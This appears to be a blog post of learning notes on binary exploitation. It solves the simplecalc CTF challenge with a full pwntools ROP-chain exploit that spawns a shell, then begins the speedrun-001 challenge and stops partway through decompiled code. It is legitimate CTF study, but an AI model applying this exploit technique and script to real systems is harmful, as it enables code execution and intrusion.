---
title: "Learning Bin Exp from Scratch 05"
date: "2024-06-04T11:59:59.999Z"
description: "ROP Overflows"
author: "ZyphenSVC"
slug: "posts/binexp/2024-06-04-binexp"
---

> Forenote

I'm bored... Might as well become a god of binary exploitation.

This would not be possible if it wasnt for [Nightmare by guyinatuxedo](https://guyinatuxedo.github.io/index.html). This series is a compilation of my summarized notes and remarks done by me and me alone.

# NX

NX also known as a non-executable stack, are types of programs where one cannot execute from the stack. 

This includes not being able to run shellcode as we have done previously.

Running a simple `checksec` command will reveal it is a nx, but we can also check using `vmmap`.

```python
$ checksec simplecalc
[*] '/mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc/simplecalc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```armasm
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004c1000 0x0000000000000000 r-x /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc/simplecalc
0x00000000006c0000 0x00000000006c3000 0x00000000000c0000 rw- /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc/simplecalc
0x00000000006c3000 0x00000000006e9000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

Would you look at that, we have `[stack]` permissioned as `rw-` which means nx. So how do we circumvent this mitigation?

We will be learning about rop and non-stack code execution.

## Boston Key Part 2016 Simple Calc

```c
undefined8
main(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param _5,
    undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  undefined8 uVar1;
  undefined8 extraout_RDX;
  undefined8 extraout_RDX_00;
  undefined8 in_RSI;
  undefined8 in_R8;
  undefined8 in_R9;
  undefined4 extraout_XMM0_Da;
  undefined4 uVar2;
  undefined8 uVar3;
  undefined buf [40];
  int operation;
  int arguments;
  void *calculations;
  int i;
  
  arguments = 0;
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  uVar1 = 0;
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  print_motd();
  printf("Expected number of calculations: ");
  __isoc99_scanf(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,"%d",
                 &arguments,extraout_RDX,uVar1,in_R8,in_R9,(char)in_RSI);
  handle_newline();
  if ((arguments < 0x100) && (3 < arguments)) {
    calculations = malloc((long)(arguments << 2));
    for (i = 0; i < arguments; i = i + 1) {
      uVar2 = print_menu();
      __isoc99_scanf(uVar2,param_2,param_3,param_4,param_5,param_6,param_7,param_8,"%d",&operation ,
                     extraout_RDX_00,uVar1,in_R8,in_R9,(char)in_RSI);
      uVar3 = handle_newline();
      if (operation == 1) {
        adds(uVar3,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
        *(undefined4 *)((long)i * 4 + (long)calculations) = DAT_006c4a88;
      }
      else if (operation == 2) {
        subs(uVar3,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
        *(undefined4 *)((long)i * 4 + (long)calculations) = DAT_006c4ab8;
      }
      else if (operation == 3) {
        muls(uVar3,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
        *(undefined4 *)((long)i * 4 + (long)calculations) = DAT_006c4aa8;
      }
      else if (operation == 4) {
        divs(uVar3,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
        *(undefined4 *)((long)i * 4 + (long)calculations) = DAT_006c4a98;
      }
      else {
        if (operation == 5) {
          memcpy(buf,calculations,(long)(arguments << 2));
          free(calculations);
          return 0;
        }
        puts("Invalid option.\n");
      }
    }
    free(calculations);
  }
  else {
    puts("Invalid number.");
  }
  return 0;
}
```

```armasm
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined8  __stdcall  main (undefined8  param_1 , undefined
             undefined8        RAX:8          <RETURN>
             undefined8        XMM0_Qa:8      param_1
             undefined4        XMM1_Da:4      param_2
             undefined4        XMM2_Da:4      param_3
             undefined4        XMM3_Da:4      param_4
             undefined4        XMM4_Da:4      param_5
             undefined4        XMM5_Da:4      param_6
             undefined4        XMM6_Da:4      param_7
             undefined4        XMM7_Da:4      param_8
             undefined4        Stack[-0xc]:4  i                                       XREF[7]:     00401443 (W) , 
                                                                                                   00401481 (R) , 
                                                                                                   004014af (R) , 
                                                                                                   004014dd (R) , 
                                                                                                   00401508 (R) , 
                                                                                                   00401567 (RW), 
                                                                                                   0040156e (R)   
             undefined8        Stack[-0x18]:8 calculations                            XREF[8]:     0040143f (W) , 
                                                                                                   0040148e (R) , 
                                                                                                   004014bc (R) , 
                                                                                                   004014ea (R) , 
                                                                                                   00401515 (R) , 
                                                                                                   00401537 (R) , 
                                                                                                   0040154a (R) , 
                                                                                                   00401577 (R)   
             undefined4        Stack[-0x1c]:4 arguments                               XREF[7]:     00401392 (W) , 
                                                                                                   004013e9 (*) , 
                                                                                                   00401409 (R) , 
                                                                                                   00401413 (R) , 
                                                                                                   0040142f (R) , 
                                                                                                   0040152e (R) , 
                                                                                                   0040156b (R)   
             undefined4        Stack[-0x20]:4 operation                               XREF[6]:     00401454 (*) , 
                                                                                                   00401474 (R) , 
                                                                                                   004014a2 (R) , 
                                                                                                   004014d0 (R) , 
                                                                                                   004014fb (R) , 
                                                                                                   00401526 (R)   
             undefined1[40]    Stack[-0x48]   buf                                     XREF[1]:     0040153b (*)   
             undefined4        Stack[-0x4c]:4 local_4c                                XREF[1]:     0040138b (W)   
             undefined8        Stack[-0x58]:8 local_58                                XREF[1]:     0040138e (W)   
                             main                                            XREF[3]:     Entry Point (*) , 
                                                                                          _start:00400f6b (*) , 004b3078 (*)   
        00401383 55              PUSH       RBP
```


This section of my post will be sticking closely to the guide because I am lost on ropchains. 

We have our arguments set as the number of calculations, and we must have it such that it is between 3 and 256. 

Then we are now dealing with memory allocations with a size of `arguments << 2`. We learn from the guide that this is the same as `arguments * 4`, which is nicer, but honestly this is the same as bit shifting which is sort of obvious.

```c

void muls(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
         undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  undefined8 in_RCX;
  undefined8 extraout_RDX;
  undefined8 extraout_RDX_00;
  undefined unaff_BPL;
  undefined8 in_R8;
  undefined8 in_R9;
  undefined4 extraout_XMM0_Da;
  undefined4 extraout_XMM0_Da_00;
  
  printf("Integer x: ");
  __isoc99_scanf(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,"%d",&x,
                 extraout_RDX,in_RCX,in_R8,in_R9,unaff_BPL);
  handle_newline();
  printf("Integer y: ");
  __isoc99_scanf(extraout_XMM0_Da_00,param_2,param_3,param_4,param_5,param_6,param_7,param_8,"%d" ,&y
                 ,extraout_RDX_00,in_RCX,in_R8,in_R9,unaff_BPL);
  handle_newline();
  if ((0x27 < x) && (0x27 < y)) {
    mulsOutput = y * x;
    printf("Result for x * y is %d.\n\n",mulsOutput);
    return;
  }
  puts("Do you really need help calculating such small numbers?\nShame on you... Bye");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

We find that both values have to be greater than 39, else it fails. This system is similar amongst all the functions, but something to note is that there is not a possibility to overflow anything here, nor a format string attack. Therefore, we must look further.

If we look in the save and exit option, we find the following piece of code:

```c
      else {
        if (operation == 5) {
          memcpy(buf,calculations,(long)(arguments << 2));
          free(calculations);
          return 0;
        }
        puts("Invalid option.\n");
      }
```

We are dealing with a memory copy from our calculations into our buffer, but it does not do a size check. Thus we can overflow the buffer.

```armasm
gef➤  b *0x40154a
Breakpoint 1 at 0x40154a
gef➤  r
Starting program: /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc/simplecalc

        |#------------------------------------#|
        |         Something Calculator         |
        |#------------------------------------#|

Expected number of calculations: 50
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 159
Integer y: 321456789
Result for x + y is 321456948.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5

Breakpoint 1, 0x000000000040154a in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdee0  →  0x0000000013290b34
$rbx   : 0x00000000004002b0  →  <_init+0> sub rsp, 0x8
$rcx   : 0x0
$rdx   : 0x0
$rsp   : 0x00007fffffffded0  →  0x00007fffffffe008  →  0x00007fffffffe27b  →  "/mnt/c/Users/sriad/Downloads/nightmare/modules/07-[...]"
$rbp   : 0x00007fffffffdf20  →  0x0000000000000000
$rsi   : 0x00000000006c8cc8  →  0x0000000000020341
$rdi   : 0x00007fffffffdfa8  →  0x0000000000000000
$rip   : 0x000000000040154a  →  <main+455> mov rax, QWORD PTR [rbp-0x10]
$r8    : 0x0
$r9    : 0x0
$r10   : 0x0
$r11   : 0x0
$r12   : 0x0
$r13   : 0x0000000000401c00  →  <__libc_csu_init+0> push r14
$r14   : 0x0000000000401c90  →  <__libc_csu_fini+0> push rbx
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffded0│+0x0000: 0x00007fffffffe008  →  0x00007fffffffe27b  →  "/mnt/c/Users/sriad/Downloads/nightmare/modules/07-[...]"        ← $rsp
0x00007fffffffded8│+0x0008: 0x0000000100400d41 ("A\r@"?)
0x00007fffffffdee0│+0x0010: 0x0000000013290b34   ← $rax
0x00007fffffffdee8│+0x0018: 0x0000000000000000
0x00007fffffffdef0│+0x0020: 0x0000000000000000
0x00007fffffffdef8│+0x0028: 0x0000000000000000
0x00007fffffffdf00│+0x0030: 0x0000000000000000
0x00007fffffffdf08│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40153f <main+444>       mov    rsi, rcx
     0x401542 <main+447>       mov    rdi, rax
     0x401545 <main+450>       call   0x4228d0 <memcpy>
●→   0x40154a <main+455>       mov    rax, QWORD PTR [rbp-0x10]
     0x40154e <main+459>       mov    rdi, rax
     0x401551 <main+462>       call   0x4156d0 <free>
     0x401556 <main+467>       mov    eax, 0x0
     0x40155b <main+472>       jmp    0x401588 <main+517>
     0x40155d <main+474>       mov    edi, 0x494402
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "simplecalc", stopped 0x40154a in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40154a → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 0x13290b34
[+] Searching '\x34\x0b\x29\x13' in memory
[+] In '[heap]'(0x6c3000-0x6e9000), permission=rw-
  0x6c4a88 - 0x6c4a98  →   "\x34\x0b\x29\x13[...]"
  0x6c8c00 - 0x6c8c10  →   "\x34\x0b\x29\x13[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffb148 - 0x7fffffffb158  →   "\x34\x0b\x29\x13[...]"
  0x7fffffffdee0 - 0x7fffffffdef0  →   "\x34\x0b\x29\x13[...]"
gef➤  i g
Ambiguous info command "g": gu, guile.
gef➤  i f
Stack level 0, frame at 0x7fffffffdf30:
 rip = 0x40154a in main; saved rip = 0x0
 Arglist at 0x7fffffffdf20, args:
 Locals at 0x7fffffffdf20, Previous frame's sp is 0x7fffffffdf30
 Saved registers:
  rbp at 0x7fffffffdf20, rip at 0x7fffffffdf28
gef➤
```

Our offset is `0x7fffffffdf28 - 0x7fffffffdee0 = 72`. Now here is the ropchain we will be constructing. Since the binary is statically linked with no PIE, we can build a rop chain using the binary for gadgets and without an infoleak. 

For this to happen, we need to control the following registers with these bits of information:

```armasm
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
```

To do this, we will use gadgets to control them. Gadgets are like `pop rax; ret`, and we also need a gadget to write `/bin/sh` in memory that we know.

When I first ran `ROPgadgets` I got 40k+ results:

```
Unique gadgets found: 46185
```

So let's do a lot less:

```python
$ ROPgadget --binary simplecalc | grep "pop rax ; ret"
0x000000000044db32 : add al, ch ; pop rax ; ret
0x000000000040b032 : add al, ch ; pop rax ; retf 2
0x000000000040b02f : add byte ptr [rax], 0 ; add al, ch ; pop rax ; retf 2
0x000000000040b030 : add byte ptr [rax], al ; add al, ch ; pop rax ; retf 2
0x00000000004b0801 : in al, 0x4c ; pop rax ; retf
0x000000000040b02e : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; pop rax ; retf 2
0x0000000000474855 : or dh, byte ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x000000000044db34 : pop rax ; ret
0x000000000045d707 : pop rax ; retf
0x000000000040b034 : pop rax ; retf 2
0x0000000000474857 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
```

Ok, that's a lot more manageable to work with. but what does this mean?

We see a gadget that let's us control the register is at `0x44db34`. Now let's repeat for the other three registers.

```armasm

$ ... grep "pop rdi ; ret"
0x000000000044bbbc : inc dword ptr [rbx - 0x7bf0fe40] ; pop rdi ; ret
0x0000000000401b73 : pop rdi ; ret
$ ... grep "pop rsi ; ret"
0x00000000004ac9b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rsi ; ret
0x00000000004ac9b6 : add byte ptr [rax], al ; pop rsi ; ret
0x0000000000437aa9 : pop rdx ; pop rsi ; ret
0x0000000000401c87 : pop rsi ; ret
$ ... grep "pop rdx ; ret"
0x00000000004a868c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rdx ; ret 0x45
0x00000000004a868e : add byte ptr [rax], al ; pop rdx ; ret 0x45
0x00000000004afd61 : js 0x4afdde ; pop rdx ; retf
0x0000000000414ed0 : or al, ch ; pop rdx ; ret 0xffff
0x0000000000437a85 : pop rdx ; ret
0x00000000004a8690 : pop rdx ; ret 0x45
0x00000000004b2dd8 : pop rdx ; ret 0xfffd
0x0000000000414ed2 : pop rdx ; ret 0xffff
0x00000000004afd63 : pop rdx ; retf
0x000000000044af60 : pop rdx ; retf 0xffff
0x00000000004560ae : test byte ptr [rdi - 0x1600002f], al ; pop rdx ; ret
```

```armasm
rax : 0x44db34
rdi : 0x401b73
rsi : 0x401c87
rdx : 0x437a85
```

Now we got our four register gadgets. And we also need to find a gadget that allows eight bytes of memory moved:

Recall that a `qword` holds eight bytes of data as referenced [here](https://zyphensvc.com/posts/binexp/2023-05-25-binexp#:~:text=Note%20that%20a%20word%20is%20two%20bytes%20of%20data%2C%20dword%20is%20four%2C%20qword%20is%20eight.)

```armasm
$ ROPgadget --binary simplecalc | grep ": mov qword" | grep "ret" | less | less
0x000000000044526e : mov qword ptr [rax], rdx ; ret
```

This gadget moves the eight bytes of data in `rdx` to `rax`, and we also had to make sure there so no extra function this gadget utilizes which is why we ignore everything else that may have had a `push` or `pop` or `jump` and so forth. 

Our last gadget we need is going to be a syscall, which executes our shell system command.

```armasm
$ ROPgadget --binary simplecalc | grep ": syscall" | less
0x0000000000400488 : syscall
```

Now this is going to be a very different than before with the utilization of vmmap.

```armasm
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004c1000 0x0000000000000000 r-x /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc/simplecalc
0x00000000006c0000 0x00000000006c3000 0x00000000000c0000 rw- /mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc/simplecalc
0x00000000006c3000 0x00000000006e9000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

Recall that we have a non-executable stack, also written as nx stack. Then using these gadgets we must be able to write somewhere on the program, right? Where can we do that? Luckily we are not dealing with PIE or ASLR that can change the addresses or regions around, but we must find some empty region of memory that can hold our gadgets.

```armasm
gef➤  x/200g 0x00000000006c0000
0x6c0000:       0x200e41280e41300e      0xe42100e42180e42
0x6c0010:       0xb4108 0xd0a40000002c
0x6c0020:       0x6cfffd1fd0    0x80e0a69100e4400
0x6c0030:       0xb42080e0a460b4b       0xe470b49080e0a57
0x6c0040:       0x8     0xd0d400000024
0x6c0050:       0x144fffd2010   0x5a020283100e4500
0x6c0060:       0xee3020b41080e0a       0x8
0x6c0070:       0xd0fc00000064  0x26cfffd2138
0x6c0080:       0xe47028f100e4200       0x48d200e42038e18
0x6c0090:       0x300e41058c280e42      0x440783380e410686
0x6c00a0:       0x41380e0a4e01a00e      0x200e42280e41300e
0x6c00b0:       0xe42100e42180e42       0x46380e0a490b4508
0x6c00c0:       0x200e42280e41300e      0xe42100e42180e42
0x6c00d0:       0xb4108 0xd1640000003c
0x6c00e0:       0xf4fffd2340    0xe47028e100e4200
0x6c00f0:       0x48c200e45038d18       0x300e410586280e44
0x6c0100:       0xed102700e440683       0x42200e41280e4430
0x6c0110:       0x80e42100e42180e       0xb01ffff00000000
0x6c0120:       0x39a0002d8050288       0xac1001ffff000005
0x6c0130:       0xc90502fb00005c01      0xff000005048b0003
0x6c0140:       0x1be036f0a01ff 0x1ffff00004801b9
0x6c0150:       0x2cc019e01a40c 0x1ffff000005038a
0x6c0160:       0xb40002f66a01f00b      0xb01ffff00000503
0x6c0170:       0x28c0001ce0501c5       0xa21201ffff000005
0x6c0180:       0x309cd000004e602       0x1980acc000b98
0x6c0190:       0x3501fb1001ffff00      0x3fd0303c40000
0x6c01a0:       0x1ffff00000504c4       0xaa0001ec0301910b
0x6c01b0:       0xb01ffff00000502       0x3810002c30301ea
0x6c01c0:       0xc80c01ffff000005      0x5e10005a301fd02
0x6c01d0:       0x720a01ffff000005      0x501fa0001bc05
0x6c01e0:       0xfd05680a01ffff00      0xff00000502bb0001
0x6c01f0:       0x2ff0301c60b01ff       0x503bd00
0x6c0200:       0x0     0x0
0x6c0210:       0x0     0x0
0x6c0220:       0x0     0x0
0x6c0230:       0x0     0x0
.
.
.
gef➤
```

Ok so it seems that our second program value area is promising, but let's check the heap because that is also a rw region.

```
gef➤  x/g 0x00000000006c3000
0x6c3000 <static_slotinfo+864>: 0x0
```

Oop, that's not good. So we have our region of memory to write to then.

In contrast to the guide, I am going to start my region of memory at `0x6c0200` as I know the following are null bytes.

Between the buf and calculations, we have the case that the overflow will overwrite this before our code get's executed. So how do we fix this?

```c
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */
  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
  if (mem == 0)                              /* free(0) has no effect */
    return;
```

This snippet is taken exactly from the `nightmare` guide. 

They state that if the argument for free is null, then it just returns. Then we can just fill the space between the start of our input and return address with null bytes, we will be fine.

```python
$ python ape.py
[+] Starting local process './simplecalc': pid 121725
[*] Switching to interactive mode
Integer x: Integer y: Result for x + y is 0.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> $
$
$ w
 12:44:58 up  8:27,  1 user,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sriadity pts/1    -                Mon13   22:47m  0.04s  0.04s -bash
$ pwd
/mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/bkp16_simplecalc
$ cat ape.py
from pwn import *

target = process("./simplecalc")

rax = 0x44db34
rdi = 0x401b73
rsi = 0x401c87
rdx = 0x437a85
qword = 0x44526e
syscall = 0x400488

def add(w):
    x = w & 0xffffffff # for sample this create "nib/"
    y = ((w & 0xffffffff00000000) >> 32) # creates "hs/"
    target.recvuntil(b"=> ")
    target.sendline(b"1\n100\n" + str.encode(str(x - 100)))
    target.recvuntil(b"=> ")
    target.sendline(b"1\n100\n" + str.encode(str(y - 100)))

target.recvuntil(b"Expected number of calculations: ")
target.sendline(b"100")

for i in range(9):
    add(0x0)

add(rax)
add(0x6c0210)
add(rdx)
add(0x0068732f6e69622f) # /bin/sh
add(qword)
add(rax) # Specify which syscall to make
add(0x3b)
add(rdi) # Pointer to /bin/sh
add(0x6c0210)
add(rsi) # Specify no arguments or env vars
add(0x0)
add(rdx)
add(0x0)
add(syscall)

target.sendline(b"5")
target.interactive()
$
```

I found out later on this finds most of the gadgets for you:

```armasm
$ ROPgadget --binary simplecalc  --ropchain | grep -i "Gadget found" | less
        [+] Gadget found: 0x470f11 mov qword ptr [rsi], rax ; ret
        [+] Gadget found: 0x401c87 pop rsi ; ret
        [+] Gadget found: 0x44db34 pop rax ; ret
        [+] Gadget found: 0x41c61f xor rax, rax ; ret
        [+] Gadget found: 0x41c61f xor rax, rax ; ret
        [+] Gadget found: 0x463b90 add rax, 1 ; ret
        [+] Gadget found: 0x463b91 add eax, 1 ; ret
        [+] Gadget found: 0x401b73 pop rdi ; ret
        [+] Gadget found: 0x401c87 pop rsi ; ret
        [+] Gadget found: 0x437a85 pop rdx ; ret
        [+] Gadget found: 0x400488 syscall
```

This was long and arduous and I feel like it set precendent for the rest of my journey.

## Defcon Quals 2019 Speedrun1

```bash
$ ./speedrun-001
Hello brave new challenger
Any last words?
s
This will be the last thing that you say: s

Alas, you had no luck today.
$ checksec speedrun-001
[*] '/mnt/c/Users/sriad/Downloads/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
```

When I open up ghidra I am unable to see any processed function, but we can find the main function using the entry point.

```c
void processEntry entry(undefined8 param_1,undefined8 param_2)

{
  undefined auStack_8 [8];
  
  FUN_00400ea0(FUN_00400bc1,param_2,&stack0x00000008,FUN_00401900,FUN_004019a0,param_1,auStack_8) ;
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}

```

Thus looking through each of the functions listed, you can determine that `FUN_00400ea0` is indeed the main function. 

```c

/* WARNING: Removing unreachable block (ram,0x004011f6) */
/* WARNING: Removing unreachable block (ram,0x00400f7a) */
/* WARNING: Removing unreachable block (ram,0x00400ed4) */
/* WARNING: Removing unreachable block (ram,0x004010d2) */
/* WARNING: Removing unreachable block (ram,0x00401204) */
/* WARNING: Removing unreachable block (ram,0x00401270) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void main(char *param_1,int param_2,long param_3,char *param_4,long param_5,long param_6,
       qword param_7)

{
 long lVar1;
 int iVar2;
 uint uVar3;
 qword qVar4;
 dword dVar5;
 uint *puVar6;
 dword extraout_EDX;
 dword dVar7;
 Elf64_Rela *pEVar8;
 long *plVar9;
 long in_FS_OFFSET;
 int local_d0;
 uint local_cc;
 int local_c8;
 uint local_c4;
 char local_c0 [4];
 char local_bc [4];
 char local_b8 [8];
 qword local_b0;
 qword local_a8;
 qword local_a0;
 char local_98 [72];
 qword *puVar1;
 dword *puVar2;
 dword *puVar3;
 
 DAT_006ba798 = 0;
 FUN_00400a60();
 DAT_006bbda8 = (long *)(param_3 + 8 + (long)param_2 * 8);
 DAT_006b8ab0 = param_7;
 plVar9 = DAT_006bbda8;
 do {
   lVar1 = *plVar9;
   plVar9 = plVar9 + 1;
 } while (lVar1 != 0);
 FUN_0044c730();
 if (DAT_006bc8a8 == (Elf64_Phdr *)0x0) {
   DAT_006bc8a8 = Elf64_Phdr_ARRAY_00400040;
   DAT_006bc8e0 = 6;
 }
 FUN_0044d440();
 FUN_0044c0d0(DAT_006bbda8);
 local_d0 = 0;
 local_cc = 0;
 puVar2 = (dword *)cpuid_basic_info(0);
 DAT_006bbde4 = *puVar2;
 pEVar8 = (Elf64_Rela *)(ulong)puVar2[1];
 dVar7 = puVar2[2];
 dVar5 = puVar2[3];
 if (puVar2[1] != 0x756e6547) goto LAB_004011b0;
 if (dVar5 != 0x6c65746e) goto LAB_004011b0;
 if (dVar7 == 0x49656e69) goto LAB_00401383;
LAB_00400fa6:
 puVar6 = (uint *)0x0;
 FUN_00400c30(0,0,0);
 DAT_006bbde0 = 3;
LAB_00400fb8:
 do {
   if ((DAT_006bbdf4 & 0x100) != 0) {
     DAT_006bbe2c = DAT_006bbe2c | 0x4000;
   }
   if ((DAT_006bbdf4 & 0x8000) != 0) {
     DAT_006bbe2c = DAT_006bbe2c | 0x8000;
   }
   DAT_006bbe18 = local_d0;
   DAT_006bbe1c = local_cc;
   FUN_0044c6d0(0,local_b8,FUN_0044d4d0);
   FUN_0044c6d0(0xb,&local_b0,0);
   DAT_006bbe40 = local_b0;
   FUN_0044c6d0(0x13,&local_a8,0);
   DAT_006bbe30 = local_a8;
   FUN_0044c6d0(0xc,&local_a0,0);
   DAT_006bbdc8 = 2;
   DAT_006bbe38 = local_a0;
   if (DAT_006bbde0 == 1) goto LAB_004012ac;
LAB_00401078:
   for (pEVar8 = Elf64_Rela_ARRAY_004001d8; pEVar8 < FUN_00400400; pEVar8 = pEVar8 + 1) {
     puVar1 = (qword *)pEVar8->r_offset;
     if (*(int *)&pEVar8->r_info != 0x25) goto LAB_004012a0;
     qVar4 = (*(code *)pEVar8->r_addend)();
     *puVar1 = qVar4;
   }
   FUN_004016b0();
   dVar5 = (dword)puVar6;
   *(ulong *)(in_FS_OFFSET + 0x28) = *DAT_006b8aa0 & 0xffffffffffffff00;
   if (DAT_006ba798 == 0) {
     uVar3 = FUN_0044e070();
     dVar5 = (dword)puVar6;
     if ((int)uVar3 < 0) {
      uVar3 = FUN_004128f0();
      goto LAB_0040144a;
     }
     if ((DAT_006bc900 == 0) || (uVar3 < DAT_006bc900)) {
      DAT_006bc900 = uVar3;
     }
     if ((int)uVar3 < 0x30200) {
      FUN_004128f0("FATAL: kernel too old\n");
LAB_00401383:
      puVar6 = &local_c4;
      FUN_00400c30(&local_d0,&local_cc,&local_c8);
      if (local_d0 != 6) goto LAB_004013a9;
      local_cc = local_c8 + local_cc;
      if (local_cc == 0x3c) goto LAB_004014eb;
      if (local_cc < 0x3d) {
        if (local_cc != 0x25) {
          if (local_cc < 0x26) {
            if (local_cc == 0x1c) {
LAB_00401423:
             DAT_006bbe2c = DAT_006bbe2c | 4;
             goto LAB_004013a9;
            }
            if (local_cc < 0x1d) {
             if (local_cc != 0x1a) goto LAB_00401490;
            }
            else if (1 < local_cc - 0x1e) goto LAB_00401490;
          }
          else {
            if (0x2f < local_cc) {
             if (local_cc == 0x37) goto LAB_004014a4;
             goto LAB_00401490;
            }
            if (local_cc < 0x2e) {
             if (local_cc == 0x26) goto LAB_00401423;
             if (local_cc != 0x2c) goto LAB_00401490;
            }
          }
        }
LAB_00401467:
        DAT_006bbe2c = DAT_006bbe2c | 0x40031;
      }
      else if (local_cc < 0x4e) {
        if (local_cc < 0x4c) {
          if (local_cc < 0x47) {
            if (local_cc < 0x45) {
             if (local_cc != 0x3f) goto LAB_00401490;
             if (3 < local_c4) goto LAB_004013a9;
            }
LAB_004014eb:
            DAT_006bbdfc = DAT_006bbdfc & 0xfffff7ff;
            goto LAB_004013a9;
          }
          if (local_cc != 0x4a) goto LAB_00401490;
        }
LAB_004014a4:
        DAT_006bbe2c = DAT_006bbe2c | 0x40230;
      }
      else {
        if (local_cc < 0x5e) {
          if (((0x5b < local_cc) || (local_cc == 0x57)) || (local_cc == 0x5a)) goto LAB_004014 a4;
        }
        else if (local_cc == 0x5f) goto LAB_004014a4;
LAB_00401490:
        if ((DAT_006bbdf0 & 0x10000000) != 0) goto LAB_00401467;
      }
LAB_004013a9:
      if ((DAT_006bbe2c & 0x400) != 0) {
        DAT_006bbe2c = DAT_006bbe2c | 0x800;
      }
      uVar3 = DAT_006bbe2c | 0x100000;
      if ((DAT_006bbdfc & 0x8000000) != 0) {
        uVar3 = DAT_006bbe2c | 0x20000;
      }
      DAT_006bbde0 = 1;
      DAT_006bbe2c = uVar3;
      goto LAB_00400fb8;
     }
   }
   *(ulong *)(in_FS_OFFSET + 0x30) = DAT_006b8aa0[1];
   if (param_6 != 0) {
     FUN_0040ed30(param_6,0,0);
   }
   FUN_0044e180(param_2,param_3,DAT_006bbda8);
   if (param_5 != 0) {
     FUN_0040ed30(param_5,0,0);
   }
   if (DAT_006b8ab8 != 0) {
     FUN_00401520();
   }
   if (param_4 != (char *)0x0) {
     (*(code *)param_4)(param_2,param_3,DAT_006bbda8);
   }
   FUN_0044bfd0(0,0);
   iVar2 = FUN_0040db50(local_98);
   if (iVar2 == 0) {
     *(char **)(in_FS_OFFSET + 0x300) = local_98;
     (*(code *)param_1)(param_2,param_3,DAT_006bbda8);
   }
   else {
     func_0x00000000();
     LOCK();
